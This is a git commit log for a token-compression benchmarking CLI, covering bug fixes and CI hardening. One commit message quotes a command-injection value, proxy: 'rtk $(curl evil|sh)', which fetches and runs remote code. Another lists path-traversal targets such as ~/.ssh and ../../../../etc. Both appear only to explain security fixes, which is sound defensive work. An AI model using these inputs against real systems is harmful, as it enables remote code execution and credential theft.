@@ -1,0 +1,131 @@
+commit 853240feb5cc2604200f84510c006a15ef1b27a0
+Author: Rudrendu <RudrenduPaul@users.noreply.github.com>
+Date:   Sun Jul 12 13:30:23 2026 -0700
+
+    Fix GitHub Actions script injection + CI/CD hardening
+
+    - action/action.yml: route proxy/tasks/repo/fail-on-regression inputs
+      through env: instead of interpolating ${{ inputs.* }} directly into the
+      run: script body. Unquoted ${{ inputs.proxy }} in a for-loop word list
+      allowed command substitution injection (e.g. proxy: "rtk $(curl evil|sh)")
+      for any consumer of this published Action who computes proxy/tasks/repo
+      from a dynamic value. tasks/repo were quoted but still breakable via an
+      embedded " character.
+    - ci.yml: add explicit permissions: contents: read (least privilege,
+      matches publish.yml's existing pattern).
+    - ci.yml, publish.yml, action.yml: pin actions/checkout and
+      actions/setup-node to commit SHA instead of the mutable v4 tag.
+
+commit 86e70be3540e23ea06f0028dc909627516d2082a
+Author: Rudrendu <RudrenduPaul@users.noreply.github.com>
+Date:   Sun Jul 12 00:08:47 2026 -0700
+
+    Write full README: verified rtk benchmark data, tokbench comparison, proxy support matrix
+
+commit 9c5193a661af2ce3fc325a3eec9fba11ede9e295
+Author: Rudrendu <RudrenduPaul@users.noreply.github.com>
+Date:   Sun Jul 12 00:04:27 2026 -0700
+
+    Sync stale package-lock.json, remove stray blank line in cli.smoke.test.ts
+
+    package.json's version/license/bin fields were already correct (0.1.0,
+    Apache-2.0, tokentrust bin entry) but package-lock.json still had the
+    npm-init defaults (1.0.0, ISC, no bin) from before those fields were set --
+    a plain npm install regenerates it to match. cli.smoke.test.ts had an
+    extraneous blank line between two it() blocks from a prior edit; removed.
+
+    No functional code change: this commit is a verification pass over the
+    already-pushed rtk-real-CLI (2e64183), headroom-scope-out (4f16217), and
+    symlink-entry-point (ed811d1) fixes. Ran the full check suite fresh
+    (lint, typecheck, test:coverage) -- 154/154 tests pass, 96.07% statements /
+    96.94% lines coverage.
+
+commit ed811d1ecf7804d1f6d318a7d89e7cac25f389a2
+Author: Rudrendu <RudrenduPaul@users.noreply.github.com>
+Date:   Sun Jul 12 00:01:34 2026 -0700
+
+    Fix CLI silently no-op'ing when invoked through a symlinked path
+
+    process.argv[1] stays as the literal invoked path while import.meta.url
+    resolves through symlinks (e.g. /tmp -> /private/tmp on macOS, or npm's
+    node_modules/.bin symlinks). pathToFileURL(process.argv[1]) then never
+    matches import.meta.url, isMainModule is silently false, and the CLI
+    exits 0 with zero output -- same failure class as the earlier
+    space-in-path bug, different trigger. Falls back to a realpath-
+    canonicalized comparison.
+
+commit 4f1621778e406bc79b678fb76c05124ff8bc3016
+Author: Rudrendu <RudrenduPaul@users.noreply.github.com>
+Date:   Sat Jul 11 23:52:38 2026 -0700
+
+    Scope headroom out of v0.1's subprocess verification harness
+
+    headroom's real CLI surface is 'headroom proxy' -- an HTTP proxy
+    server, not a one-shot compression command -- so it cannot be driven
+    by v0.1's subprocess-based harness (spawn a binary, pipe stdin, read
+    stdout). runVerify() now intercepts 'headroom' in its dispatch loop
+    and prints a documented not-yet-supported message before a
+    HeadroomAdapter is ever constructed, instead of letting a nonexistent
+    compress invocation fail unpredictably.
+
+commit 2e6418318a673b37342976bd807749eb8383e075
+Author: Rudrendu <RudrenduPaul@users.noreply.github.com>
+Date:   Sat Jul 11 23:52:23 2026 -0700
+
+    Fix RtkAdapter to invoke rtk's real CLI surface, not an invented command
+
+    RtkAdapter previously spawned 'rtk compress --stdin', a command that
+    never existed on the real rtk binary. Replace it with rtk's actual
+    CLI surface: 'rtk pipe --filter <name>' for stdin-based filter tasks,
+    'rtk read -l aggressive <files>' for file-based tasks, chosen per task
+    via a new overridable buildCompressInvocation() hook on BaseAdapter.
+
+commit 3ad17766a1e3d9fb9fcf0de4a42d94101fc9a20b
+Author: Rudrendu <RudrenduPaul@users.noreply.github.com>
+Date:   Sat Jul 11 22:55:58 2026 -0700
+
+    Fix TT01 reporting an impossible ~100% reduction on a failed compress run
+
+    BaseAdapter.run() ignored the exit code from the proxy's compress
+    subprocess and returned whatever came back on stdout as the compressed
+    output, even when the invocation failed. A failed run typically prints
+    nothing to stdout, so the tokenizer counted near-zero after-tokens,
+    saturating TT01's reduction to ~100% -- exceeding the proxy's own claim
+    in a way that read as even better than promised, when it was actually
+    a broken measurement.
+
+commit 2d35f7286cb1a6af2a0e30b2b51441ad5d724a16
+Author: Rudrendu <RudrenduPaul@users.noreply.github.com>
+Date:   Sat Jul 11 22:55:42 2026 -0700
+
+    Fix verify --help crashing with ERR_PARSE_ARGS_UNKNOWN_OPTION
+
+    node:util's parseArgs() is strict by default and neither --help nor -h
+    was declared in its options schema, so tokentrust verify --help (and
+    the top-level tokentrust --help) threw an unhandled
+    ERR_PARSE_ARGS_UNKNOWN_OPTION stack trace instead of printing usage.
+
+commit facd42fb5ea3e1ae324d8e42c5630a23fb09ab68
+Author: Rudrendu <RudrenduPaul@users.noreply.github.com>
+Date:   Sat Jul 11 21:51:33 2026 -0700
+
+    Fix arbitrary local file read via malicious tasks.yml fixture_repo
+
+    A task's fixture_repo field was resolved with no containment check:
+    an absolute path (e.g. /etc, ~/.ssh) was passed through directly, and
+    a relative path could traverse outside the corpus file's own
+    directory (../../../../etc). loadFixtureContext then reads every file
+    under that path recursively and concatenates it into the task
+    'context' text passed to proxy adapters -- and in --live mode, that
+    exact text is POSTed straight to a third-party API as message content.
+
+commit 8314d8d8233160b598d5656a7c7e898eeee0b2ac
+Author: Rudrendu <RudrenduPaul@users.noreply.github.com>
+Date:   Sat Jul 11 21:47:42 2026 -0700
+
+    Warn when --live is combined with multiple --proxy flags
+
+    --live only ever verified the first proxy per invocation (by design, to
+    keep real API spend bounded to one --live-max-tasks sample) but did not
+    tell the user the other proxies were falling back to the free local-
+    tokenizer estimate. Add an explicit terminal note and a regression test.
